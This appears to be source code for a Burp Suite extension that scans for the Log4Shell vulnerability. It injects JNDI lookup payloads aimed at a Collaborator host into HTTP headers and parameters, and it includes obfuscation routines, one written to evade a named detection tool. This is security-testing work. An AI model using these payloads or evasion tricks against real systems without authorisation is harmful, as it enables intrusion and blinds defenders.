# Author: Sven Schlueter <sven+yLog4j@y-security.de>
# Date: 31.01.2022
# Company: Y-Security GmbH (https://www.y-security.de)
#
# Some Testcases from: https://github.com/leonjza/log4jpwn.git
#
# Based on activeScan++ by James Kettle <albinowax+acz@gmail.com>
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
# http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
try:
    import pickle
    import random
    import re
    import string
    import time
    import copy
    import base64
    import jarray
    import traceback
    from string import Template
    from cgi import escape
    from burp import IBurpExtender, IScannerInsertionPointProvider, IScannerInsertionPoint, IParameter, IScannerCheck, IScanIssue
    import jarray
    from javax.swing import JMenuItem
    from javax.swing import AbstractAction        
except ImportError:
    print "Failed to load dependencies. This issue may be caused by using the unstable Jython 2.7 beta."

VERSION = "0.6"
FAST_MODE = False
DEBUG = False
callbacks = None
helpers = None

TOCAMEL=0 # CamelCase
SUBSTIONE=1 # works alone and in combindation with others
SUBSTITWO=1 # works alone and in combindation with others
SUBSTINONE=1 # works alone and in combindation with others
FLORIAN=0 # better not combine with others, request will become too large likely
HEXER=0 # careful, seems to break some tests


yInjections = [ 
    '${jndi:dns://collabToken}',
    '${jndi:rmi://collabToken}',
    '${jndi:ldap://collabToken}',
    '${jndi:ldaps://collabToken}',
    '${jndi:nis://collabToken}',
    '${jndi:nds://collabToken}',
    '${jndi:corba://collabToken}',
    '${jndi:iiop://collabToken}',
]

yHeaders = [
    "Accept",
    "Accept-Charset",
    "Accept-Datetime",
    "Accept-Encoding",
    "Accept-Language",
    "Access-Control-Request-Headers",
    "Access-Control-Request-Method",
    "Authorization",
    "Authorization: Basic",
    "Authorization: Bearer",
    "Authorization: Oauth",
    "Authorization: Token",
    "Cache-Control",
    "Cf-Connecting_ip",
    "Client-Ip",
    "Connection",
    "Contact",
    "Content-Length",
    "Content-MD5",
    "Content-Type",
    "Cookie",
    "DNT",
    "Date",
    "Expect",
    "Forwarded",
    "Forwarded-For",
    "Forwarded-For-Ip",
    "From",
    "Front-End-Https",
    "Host",
    "If-Match",
    "If-Modified-Since",
    "If-None-Match",
    "If-Range",
    "If-Unmodified-Since",
    "Max-Forwards",
    "Origin",
    "Originating-Ip",
    "Pragma",
    "Proxy-Authorization",
    "Proxy-Connection",
    "Range",
    "Referer",
    "TE",
    "True-Client-Ip",
    "Upgrade",
    "User-Agent",
    "Via",
    "Warning",
    "X-ATT-DeviceId",
    "X-Api-Version",
    "X-Bug-Bounty",
    "X-Client-Ip",
    "X-Forwarded-For",
    "X-Forwarded-Host",
    "X-Forwarded-Proto",
    "X-Http-Method-Override",
    "X-Leakix",
    "X-Originating-Ip",
    "X-Real-Ip",
    "X-Remote-Addr",
    "X-Remote-Ip",
    "X-Requested-With",
    "X-Wap-Profile",
    "\u0079Invalid",
    "jndi"
]

AttackNo=0
if TOCAMEL==1:
    AttackNo=AttackNo+1
if SUBSTIONE == 1:
    AttackNo=AttackNo+1	
if SUBSTITWO == 1:
    AttackNo=AttackNo+1	
if SUBSTINONE == 1:
    AttackNo=AttackNo+1		
if FLORIAN == 1:
    AttackNo=AttackNo+1
#if HEXER == 1:
#	AttackNo=AttackNo+1

def safe_bytes_to_string(bytes):
    if bytes is None:
        bytes = ''
    return helpers.bytesToString(bytes)

def html_encode(string):
    return string.replace("<", "&lt;").replace(">", "&gt;")

class BurpExtender(IBurpExtender):
    def registerExtenderCallbacks(self, this_callbacks):
        global callbacks, helpers
        callbacks = this_callbacks
        helpers = callbacks.getHelpers()
        callbacks.setExtensionName("yLog4j")

        # gracefully skip checks requiring Collaborator if it's disabled
        collab_enabled = True
        if '"type":"none"' in callbacks.saveConfigAsJson("project_options.misc.collaborator_server"):
            collab_enabled = False
            print "Collaborator not enabled; skipping checks that require it"
        
        callbacks.registerScannerCheck(PerRequestScans())
        callbacks.registerScannerInsertionPointProvider(BasicAuthInsertionPointProvider(callbacks))

        if not FAST_MODE:
            if collab_enabled:
                callbacks.registerScannerCheck(yJNDI())

        print "Successfully loaded yLog4j v" + VERSION

        return

class PerRequestScans(IScannerCheck):
    def __init__(self):
        self.scan_checks = [
            self.doJNDIHEAD,
        ]

    def doPassiveScan(self, basePair):
        return []

    def doActiveScan(self, basePair, insertionPoint):
        if not self.should_trigger_per_request_attacks(basePair, insertionPoint):
            return []

        issues = []
        for scan_check in self.scan_checks:
            try:
		if scan_check is not None and basePair is not None and issues is not None:
	                issues.extend(scan_check(basePair))
            except Exception:
                print 'Error executing PerRequestScans.'+scan_check.__name__+': '
#                print traceback.format_exc()

        return issues

    def should_trigger_per_request_attacks(self, basePair, insertionPoint):
        request = helpers.analyzeRequest(basePair.getRequest())
        params = request.getParameters()

        # if there are no parameters, scan if there's a HTTP header
        if params:
            # pick the parameter most likely to be the first insertion point
            first_parameter_offset = 999999
            first_parameter = None
            for param_type in (IParameter.PARAM_BODY, IParameter.PARAM_URL, IParameter.PARAM_JSON, IParameter.PARAM_XML, IParameter.PARAM_XML_ATTR, IParameter.PARAM_MULTIPART_ATTR, IParameter.PARAM_COOKIE):
                for param in params:
                    if param.getType() != param_type:
                        continue
                    if param.getNameStart() < first_parameter_offset:
                        first_parameter_offset = param.getNameStart()
                        first_parameter = param
                if first_parameter:
                    break

            if first_parameter and first_parameter.getName() == insertionPoint.getInsertionPointName():
                return True

        elif insertionPoint.getInsertionPointType() == IScannerInsertionPoint.INS_HEADER and insertionPoint.getInsertionPointName() == 'User-Agent':
            return True

        return False

    def doJNDIHEAD(self, basePair):
        for yHeader in yHeaders:
            for yInjection in yInjections:
                #print "working on: "+yInjection+" for "+yHeader
                collab = callbacks.createBurpCollaboratorClientContext()
                collabToken = collab.generatePayload(True)
                yInjection = yInjection.replace("collabToken",collabToken)
                yL = yJNDI()

                if SUBSTIONE == 1:
                    yInjection=yL.SUBONE(yInjection, AttackNo)

                if SUBSTITWO == 1:
                    yInjection=yL.SUBTWO(yInjection, AttackNo)

                if SUBSTINONE == 1:
                    yInjection=yL.SUBNON(yInjection, AttackNo)

                if FLORIAN == 1:
                    yInjection=yL.FLORO(yInjection, AttackNo)

                if HEXER == 1:
                    yInjection=yL.HEXE(yInjection, AttackNo)

                if TOCAMEL == 1:
                    yInjection=yL.CAMEL(yInjection, AttackNo)	

                if "Authorization:" in yHeader:
                    yHeader="Authorization"
                    if "Basic" in yHeader:
                        yInjection = "Basic " + base64.b64encode(yInjection+":YisthePassword")
                    if "Bearer" in yHeader:
                        yInjection = "Bearer " + base64.b64encode(yInjection+":YisthePassword")
                    if "Oauth" in yHeader:
                        yInjection = "Oauth " + base64.b64encode(yInjection+":YisthePassword")
                    if "Token" in yHeader:
                        yInjection = "Token " + base64.b64encode(yInjection+":YisthePassword")                        
                if "jndi:" in yHeader:
                    yHeader = yInjection                 
                (ignore, req) = setHeader(basePair.getRequest(), yHeader, yInjection, True)
                attack = callbacks.makeHttpRequest(basePair.getHttpService(), req)
                interactions = collab.fetchAllCollaboratorInteractions()
                if interactions:
                    
                    try:
                        yA = basePair.getHttpService()   
                    except Exception:
                        print 'Error in executing log4j attack request A'                
                    try:
                        yB = helpers.analyzeRequest(basePair).getUrl()  
                    except Exception:
                        print 'Error in executing log4j attack request B'                                
                    try:
                        yC = [attack]
                    except Exception:
                        print 'Error in executing log4j attack request C'     
                    try:




                        yD = CustomScanIssue(yA, yB, yC,
                                            'Log4Shell (CVE-2021-44228 / CVE-2021-45046)',
                                            "The application appears to be running a version of log4j vulnerable to Remote Code Execution. yLog4j received a pingback from the server.<br/><br/>" +
                                            "Apache Log4j library versions 2.0 to 2.15 are affected. Further information can be obtained via <a href='https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44228'>CVE-2021-44228</a> and <a href='https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-45046'>CVE-2021-45046</a><br/><br/>" +
                                            "Want to know the exploitability or have this tested on scale? Feel free to contact us via <a href='mailto:info+log4j@y-security.de'>E-Mail</a><br/><br/>" +
                                            "<b>Recommendation</b><br>LunaSec has released a comprehensive Post on the mitigation options for this vulnerability here: https://www.lunasec.io/docs/blog/log4j-zero-day-mitigation-guide/",
                                            'Firm', 'High')
                    except Exception:
                        print 'Error in executing log4j attack request D'                                                                                                                

                    return [yD]
                                

class yJNDI(IScannerCheck):
    def doActiveScan(self, basePair, insertionPoint):
        for yInjection in yInjections:
            #print "working on: "+yInjection
            collab = callbacks.createBurpCollaboratorClientContext()
            collabToken = collab.generatePayload(True)
            yInjection = yInjection.replace("collabToken",collabToken)

            if SUBSTIONE == 1:
                yInjection=self.SUBONE(yInjection, AttackNo)

            if SUBSTITWO == 1:
                yInjection=self.SUBTWO(yInjection, AttackNo)

            if SUBSTINONE == 1:
                yInjection=self.SUBNON(yInjection, AttackNo)

            if FLORIAN == 1:
                yInjection=self.FLORO(yInjection, AttackNo)

            if HEXER == 1:
                yInjection=self.HEXE(yInjection, AttackNo)

            if TOCAMEL == 1:
                yInjection=self.CAMEL(yInjection, AttackNo)	

            try:
                attack = request(basePair, insertionPoint, yInjection)
            except Exception:
                print 'Error in executing log4j attack request'
            interactions = collab.fetchAllCollaboratorInteractions()
            if interactions:
                try:
                    yA = attack.getHttpService()
                except Exception:
                    print 'Error in executing log4j attack request A'                
                try:
                    yB = helpers.analyzeRequest(attack).getUrl()       
                except Exception:
                    print 'Error in executing log4j attack request B'                                
                try:
                    yC = [attack]
                except Exception:
                    print 'Error in executing log4j attack request C'     
                try:
                    yD = CustomScanIssue(yA, yB, yC,
                                            'Log4Shell (CVE-2021-44228 / CVE-2021-45046)',
                                            "The application appears to be running a version of log4j vulnerable to Remote Code Execution. yLog4j received a pingback from the server.<br/><br/>" +
                                            "Apache Log4j library versions 2.0 to 2.15 are affected. Further information can be obtained via <a href='https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44228'>CVE-2021-44228</a> and <a href='https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-45046'>CVE-2021-45046</a><br/><br/>" +
                                            "Want to know the exploitability or have this tested on scale? Feel free to contact us via <a href='mailto:info+log4j@y-security.de'>E-Mail</a><br/><br/>" +
                                            "<b>Recommendation</b><br>LunaSec has released a comprehensive Post on the mitigation options for this vulnerability here: https://www.lunasec.io/docs/blog/log4j-zero-day-mitigation-guide/",
                                            'Firm', 'High')
                except Exception:
                    print 'Error in executing log4j attack request D'                                                                                                                

                return [yD]

    def SUBONE(self, StrToConvert, AttackNo):
        # Empty strings are placed between characters and a concat is performed
        # In:  ${jndi:dns://collabToken}
        # Out: ${${::-}j${::-}n${::-}d${::-}i${::-}:${::-}d${::-}n${::-}s${::-}:${::-}/${::-}/${::-}c${::-}o${::-}l${::-}l${::-}a${::-}b${::-}T${::-}o${::-}k${::-}e${::-}n}
        if DEBUG >= 1: print "SUBSTIONE BEFORE: "+str(StrToConvert)			
        new=""
        for ychar in StrToConvert:
            if ychar in '${}':
                new=new+ychar
            else:
                if  AttackNo == 1:
                    ATTACKER=1
                else:
                    ATTACKER=random.randrange(1, AttackNo)
                if ATTACKER == 1:
                    new=new+'${::-}'+ychar
                else:
                    new=new+ychar				
        if DEBUG >= 1: print "SUBSTIONE AFTER: "+str(new)						
        StrToConvert=new
        return  StrToConvert

    def SUBTWO(self, StrToConvert, AttackNo):
        # Characters are concated
        # In:  ${jndi:dns://collabToken}
        # Out: ${${::-j}${::-n}${::-d}${::-i}${::-:}${::-d}${::-n}${::-s}${::-:}${::-/}${::-/}${::-c}${::-o}${::-l}${::-l}${::-a}${::-b}${::-T}${::-o}${::-k}${::-e}${::-n}}
        if DEBUG >= 1: print "SUBSTITWO BEFORE: "+str(StrToConvert)			
        new=""
        for ychar in StrToConvert:
            if ychar in '${}':
                new=new+ychar
            else:
                if  AttackNo == 1:
                    ATTACKER=1
                else:
                    ATTACKER=random.randrange(1, AttackNo)
                if ATTACKER == 1:						
                    new=new+'${::-'+ychar+'}'
                else:
                    new=new+ychar
        if DEBUG >= 1: print "SUBSTITWO AFTER: "+str(new)						
        StrToConvert=new
        return  StrToConvert


    def SUBNON(self, StrToConvert, AttackNo):
        # Random characters are deleted before the string is concated
        # In:  ${jndi:dns://collabToken}
        # Out: ${${kfjm6M:pUTx:-j}${FbX:la9:-n}${icCjoH:4nAY:-d}${8Xnti:Pli:-i}${pNlL:Cy8e0a:-:}${pCACO0:q7ISYp:-d}${IiLJvr:J550:-n}${gZy:sd0jIV:-s}${gCm:vXJ:-:}${9lf1J:uQIGLb:-/}${kSQ1f2:oMZ:-/}${inQwAN:hRfgUR:-c}${b5V:93uANU:-o}${HO9:JiDBIU:-l}${C6xf:rv7:-l}${Z26IG:r8ZaN:-a}${xwhCVH:ffnr4v:-b}${WCcW:s74NX:-T}${UeC:Tu5rk:-o}${VB44f:c1kuh5:-k}${FKMQZ:PkL:-e}${GJC:Yyq:-n}}
        CHARS="abcdefghijklmnopqrstuvwxyABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789" 		
        if DEBUG >= 1: print "SUBNONE BEFORE: "+str(StrToConvert)			
        new=""
        for ychar in StrToConvert:
            if ychar in '${}':
                new=new+ychar
            else:
                if  AttackNo == 1:
                    ATTACKER=1
                else:
                    ATTACKER=random.randrange(1, AttackNo)
                if ATTACKER == 1:
                    # ${what:ever:-j}
                    randA = ''.join(random.choice(CHARS) for _ in range(random.randrange(3,7)))				
                    randB = ''.join(random.choice(CHARS) for _ in range(random.randrange(3,7)))
                    new=new+'${'+randA+':'+randB+':-'+ychar+'}'
                else:
                    new=new+ychar
        if DEBUG >= 1: print "SUBNONE AFTER: "+str(new)						
        StrToConvert=new	
        return 	StrToConvert

    def FLORO(self, StrToConvert, AttackNo):
        # Bypass for Florian Roth Tool https://github.com/Neo23x0/log4shell-detector by placing many empty subsitutions between chars
        # IN:  ${jndi:dns://collabToken}
        # Out: ${${::-}${::-}${::-}${::-}${::-}${::-}${::-}${::-}${::-}j${::-}${::-}${::-}${::-}n${::-}${::-}${::-}${::-}${::-}d${::-}${::-}${::-}${::-}${::-}${::-}i${::-}${::-}${::-}${::-}${::-}:${::-}${::-}${::-}${::-}${::-}d${::-}${::-}${::-}${::-}n${::-}${::-}${::-}${::-}s${::-}${::-}${::-}${::-}${::-}${::-}${::-}${::-}${::-}:${::-}${::-}${::-}${::-}${::-}${::-}/${::-}${::-}${::-}${::-}${::-}${::-}${::-}${::-}/${::-}${::-}${::-}${::-}${::-}${::-}${::-}${::-}${::-}c${::-}${::-}${::-}${::-}${::-}${::-}${::-}${::-}${::-}o${::-}${::-}${::-}${::-}${::-}${::-}${::-}${::-}${::-}l${::-}${::-}${::-}${::-}${::-}${::-}l${::-}${::-}${::-}${::-}${::-}${::-}a${::-}${::-}${::-}${::-}${::-}${::-}${::-}b${::-}${::-}${::-}${::-}${::-}${::-}${::-}${::-}T${::-}${::-}${::-}${::-}${::-}${::-}${::-}${::-}o${::-}${::-}${::-}${::-}${::-}${::-}k${::-}${::-}${::-}${::-}${::-}${::-}${::-}${::-}e${::-}${::-}${::-}${::-}${::-}${::-}n}
        if DEBUG >= 1: print "FLORIAN BEFORE: "+str(StrToConvert)			
        new=""
        for ychar in StrToConvert:
            if ychar in '${}':
                new=new+ychar
            else:
                if  AttackNo == 1:
                    ATTACKER=1
                else:
                    ATTACKER=random.randrange(1, AttackNo)
                if ATTACKER == 1:
                    bypassFlorianRoth = "${::-}"*random.randrange(4,10)
                    new=new+bypassFlorianRoth+ychar
                else:
                    new=new+ychar				
        if DEBUG >= 1: print "FLORIAN AFTER: "+str(new)						
        StrToConvert=new
        return StrToConvert	

    def HEXE(self, StrToConvert, AttackNo):
        # Do some Hex encoding for Key characters 
        # IN:  ${jndi:dns://collabToken}
        # Out: 
        HEXER_CHARS="${}:/'\""
        if DEBUG >= 1: print "HEXER BEFORE: "+str(StrToConvert)
        for HEXERCHAR in HEXER_CHARS:
            StrToConvert=StrToConvert.replace(HEXERCHAR,'%'+str(format(ord(HEXERCHAR), "x")))		
        if DEBUG >= 1: print "HEXER AFTER: "+str(StrToConvert)	
        return 	StrToConvert

    def CAMEL(self, StrToConvert, AttackNo):
        # Characters are randomly written in lower and upper case
        # In:  ${jndi:dns://collabToken}
        # Out: ${${lower:J}${lower:N}${lower:D}${lower:I}:${lower:D}${lower:N}${lower:S}:${lower:/}${upper:/}${upper:C}${lower:O}${upper:l}${lower:L}${upper:A}${upper:B}${upper:t}${upper:o}${lower:K}${lower:E}${upper:n}} 		
        if DEBUG >= 1: print "TOCAMEL BEFORE: "+str(StrToConvert)
        new=""
        FINDCOL=0
        for ychar in StrToConvert:
            if ychar in '${}:': # those chars are unsupported by upper/lower, but potentially used in injection
                new=new+ychar
            else:
                if random.choice([True, False]):
                    new=new+'${lower:'+ychar.upper()+'}'
                else:
                    if FINDCOL == 0: # only left from : upper is allowed
                        if random.choice([True, False]):
                            new=new+'${upper:'+ychar.lower()+'}'
                        else:
                            new=new+'${upper:'+ychar.upper()+'}'
                    else:
                        if random.choice([True, False]):
                            new=new+'${lower:'+ychar.lower()+'}'
                        else:
                            new=new+'${lower:'+ychar.upper()+'}'
        if DEBUG >= 1: print "TOCAMEL AFTER: "+str(new)
        StrToConvert=new
        return StrToConvert

    def doPassiveScan(self, basePair):
        return []

    def consolidateDuplicateIssues(self, existingIssue, newIssue):
        return is_same_issue(existingIssue, newIssue)

class CustomScanIssue(IScanIssue):
    def __init__(self, httpService, url, httpMessages, name, detail, confidence, severity):
        try:
            self.HttpService = httpService
            self.Url = url
            self.HttpMessages = httpMessages
            self.Name = name
            self.Detail = detail
            self.Severity = severity
            self.Confidence = confidence
            print "Reported: " + name + " on " + str(url)
            return
        except Exception:
            print 'Error in CustomScanIssue init'         

    def getUrl(self):
        try:
            return self.Url
        except Exception:
            print 'Error in CustomScanIssue geturl'              

    def getIssueName(self):
        try:
            return self.Name
        except Exception:
            print 'Error in CustomScanIssue getIssueName'              

    def getIssueType(self):
        try:
            return 0
        except Exception:
            print 'Error in CustomScanIssue getIssueType'              

    def getSeverity(self):
        try:
            return self.Severity
        except Exception:
            print 'Error in CustomScanIssue getSeverity'              

    def getConfidence(self):
        try:
            return self.Confidence
        except Exception:
            print 'Error in CustomScanIssue getConfidence'              

    def getIssueBackground(self):
        try:
            return None
        except Exception:
            print 'Error in CustomScanIssue getIssueBackground'              

    def getRemediationBackground(self):
        try:
            return None
        except Exception:
            print 'Error in CustomScanIssue getRemediationBackground'              

    def getIssueDetail(self):
        try:
            return self.Detail
        except Exception:
            print 'Error in CustomScanIssue getIssueDetail'              

    def getRemediationDetail(self):
        try:
            return None
        except Exception:
            print 'Error in CustomScanIssue getRemediationDetail'              

    def getHttpMessages(self):
        try:
            return self.HttpMessages
        except Exception:
            print 'Error in CustomScanIssue getHttpMessages'              

    def getHttpService(self):
        try:
            return self.HttpService
        except Exception:
            print 'Error in CustomScanIssue getHttpService'              


class BasicAuthInsertionPointProvider(IScannerInsertionPointProvider):
    def __init__(self, callbacks):
        self.callbacks = callbacks
        self.doneHosts = set()

    def getInsertionPoints(self, baseRequestResponse):
        request = baseRequestResponse.getRequest()
        requestInfo = self.callbacks.getHelpers().analyzeRequest(baseRequestResponse.getHttpService(), request)
        for header in requestInfo.getHeaders():
            if header.startswith("Authorization: Basic "):
                host = requestInfo.getUrl().getHost() + ":" + str(requestInfo.getUrl().getPort())
                if host in self.doneHosts:
                    return []
                else:
                    self.doneHosts.add(host)
                    return [BasicAuthInsertionPoint(request, 0), BasicAuthInsertionPoint(request, 1)]


class BasicAuthInsertionPoint(IScannerInsertionPoint):
    def __init__(self, baseRequest, position):
        self.baseRequest = ''.join(map(chr, baseRequest))
        self.position = position
        match = re.search("^Authorization: Basic (.*)$", self.baseRequest, re.MULTILINE)
        self.baseBlob = match.group(1)
        self.baseValues = base64.b64decode(self.baseBlob).split(':')
        self.baseOffset = self.baseRequest.index(self.baseBlob)

    def getInsertionPointName(self):
        return "BasicAuth" + ("UserName" if self.position == 0 else "Password")

    def getBaseValue(self):
        return self.baseValues[self.position]

    def makeBlob(self, payload):
        values = list(self.baseValues)
        values[self.position] = ''.join(map(chr, payload))
        return base64.b64encode(':'.join(values))

    def buildRequest(self, payload):
        return self.baseRequest.replace(self.baseBlob, self.makeBlob(payload))

    def getPayloadOffsets(self, payload):
        return jarray.array([self.baseOffset, self.baseOffset + len(self.makeBlob(payload))], 'i')

    def getInsertionPointType(self):
        return IScannerInsertionPoint.INS_EXTENSION_PROVIDED


# misc utility methods

def launchPassiveScan(attack):
    if attack.getResponse() is None:
        return
    service = attack.getHttpService()
    using_https = service.getProtocol() == 'https'
    callbacks.doPassiveScan(service.getHost(), service.getPort(), using_https, attack.getRequest(),
                            attack.getResponse())
    return


def location(url):
    return url.getProtocol() + "://" + url.getAuthority() + url.getPath()


def htmllist(list):
    list = ["<li>" + item + "</li>" for item in list]
    return "<ul>" + "\n".join(list) + "</ul>"


def tagmap(resp):
    tags = ''.join(re.findall("(?im)(<[a-z]+)", resp))
    return tags


def randstr(length=12, allow_digits=True):
    candidates = string.ascii_lowercase
    if allow_digits:
        candidates += string.digits
    return ''.join(random.choice(candidates) for x in range(length))


def hit(resp, baseprint):
    return (baseprint == tagmap(resp))

def anchor_change(probe, expect):
    left = randstr(4)
    right = randstr(4, allow_digits=False)
    probe = left + probe + right
    expected = []
    for x in expect:
        expected.append(left + x + right)
    return probe, expected

# currently unused as .getUrl() ignores the query string
def issuesMatch(existingIssue, newIssue):
    if (existingIssue.getUrl() == newIssue.getUrl() and existingIssue.getIssueName() == newIssue.getIssueName()):
        return -1
    else:
        return 0


def getIssues(name):
    prev_reported = filter(lambda i: i.getIssueName() == name, callbacks.getScanIssues(''))
    return (map(lambda i: i.getUrl(), prev_reported))


def request(basePair, insertionPoint, attack):
    req = insertionPoint.buildRequest(attack)
    return callbacks.makeHttpRequest(basePair.getHttpService(), req)

def is_same_issue(existingIssue, newIssue):
    if existingIssue.getIssueName() == newIssue.getIssueName():
        return -1
    else:
        return 0


def debug_msg(message):
    if DEBUG:
        print message


def setHeader(request, name, value, add_if_not_present=False):
    # find the end of the headers
    prev = ''
    i = 0
    while i < len(request):
        this = request[i]
        if prev == '\n' and this == '\n':
            break
        if prev == '\r' and this == '\n' and request[i - 2] == '\n':
            break
        prev = this
        i += 1
    body_start = i

    # walk over the headers and change as appropriate
    headers = safe_bytes_to_string(request[0:body_start])
    headers = headers.splitlines()
    modified = False
    for (i, header) in enumerate(headers):
        value_start = header.find(': ')
        header_name = header[0:value_start]
        if header_name == name:
            new_value = header_name + ': ' + value
            if new_value != headers[i]:
                headers[i] = new_value
                modified = True

    # stitch the request back together
    if modified:
        modified_request = helpers.stringToBytes('\r\n'.join(headers) + '\r\n') + request[body_start:]
    elif add_if_not_present:
        # probably doesn't work with POST requests
        real_start = helpers.analyzeRequest(request).getBodyOffset()
        modified_request = request[:real_start-2] + helpers.stringToBytes(name + ': ' + value + '\r\n\r\n') + request[real_start:]
    else:
        modified_request = request

    return modified, modified_request
